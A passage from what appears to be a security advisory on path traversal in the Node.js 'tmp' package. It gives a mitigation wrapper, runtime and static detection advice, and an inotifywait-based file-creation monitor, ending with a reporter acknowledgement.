function(options, callback) {\n  return originalFile(options, (err, path, fd, cleanup) =\u003e {\n    if (!err \u0026\u0026 options.tmpdir) {\n      const relative = require('path').relative(options.tmpdir, path);\n      if (relative.startsWith('..')) {\n        console.warn('Path traversal detected:', path);\n      }\n    }\n    return callback(err, path, fd, cleanup);\n  });\n};\n```\n\n### Detection and Monitoring\n\n**Static Analysis:**\n- Scan for tmp usage with user-controlled input\n- Identify unsanitized parameter passing to tmp functions\n- Review file creation patterns in temporary directories\n\n**Runtime Detection:**\n```javascript\n// Log suspicious tmp operations\nfunction monitorTmpUsage() {\n  const originalTmpFile = require('tmp').file;\n  \n  require('tmp').file = function(options = {}, callback) {\n    // Check for suspicious patterns\n    const suspicious = [\n      options.prefix \u0026\u0026 options.prefix.includes('..'),\n      options.postfix \u0026\u0026 options.postfix.includes('..'),  \n      options.dir \u0026\u0026 path.isAbsolute(options.dir)\n    ].some(Boolean);\n    \n    if (suspicious) {\n      console.warn('Suspicious tmp usage detected:', options);\n    }\n    \n    return originalTmpFile.call(this, options, callback);\n  };\n}\n```\n\n**File System Monitoring:**\n```bash\n# Monitor file creation outside expected temp directories\ninotifywait -m -r --format '%w%f %e' /tmp /var/tmp | while read file event; do\n  if [[ \"$event\" == *\"CREATE\"* \u0026\u0026 \"$file\" != /tmp/tmp-* ]]; then\n    echo \"Unexpected file creation: $file\"\n  fi\ndone\n```\n### Acknowledgements\n\n**Reported by**: Mapta / BugBunny_ai"
